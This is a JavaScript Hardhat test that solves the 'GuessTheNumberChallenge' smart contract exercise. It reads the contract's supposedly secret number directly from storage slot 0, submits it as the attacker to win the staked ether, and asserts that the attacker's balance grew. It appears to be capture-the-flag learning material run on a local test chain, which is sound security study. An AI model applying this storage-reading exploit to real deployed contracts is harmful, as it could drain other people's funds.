const { ethers } = require("hardhat");
const { expect } = require("chai");

const BigNumber = ethers.BigNumber;


describe("GuessTheNumberChallenge", function () {
    let contract;
    let owner;
    let attacker;


    this.beforeEach(async function () {
        [owner, attacker] = await ethers.getSigners();
        console.log("Constructor");
        const GuessTheNumberChallengeContract = await ethers.getContractFactory("GuessTheNumberChallenge");
        contract = await GuessTheNumberChallengeContract.deploy({value: ethers.utils.parseEther("1")});
        await contract.deployed()
    });

    describe("attacker", function () {
        it("Exploit GuessTheNumberChallenge", async function () {
            let number = await ethers.provider.getStorageAt(contract.address, BigNumber.from("0"));
            let balance = await ethers.provider.getBalance(attacker.address);
            console.log
            await contract.connect(attacker).guess(number, {value: ethers.utils.parseEther("1")});
            console.log("Function4");
            expect(await ethers.provider.getBalance(attacker.address)).to.be.greaterThan(balance);
        });
    });
});
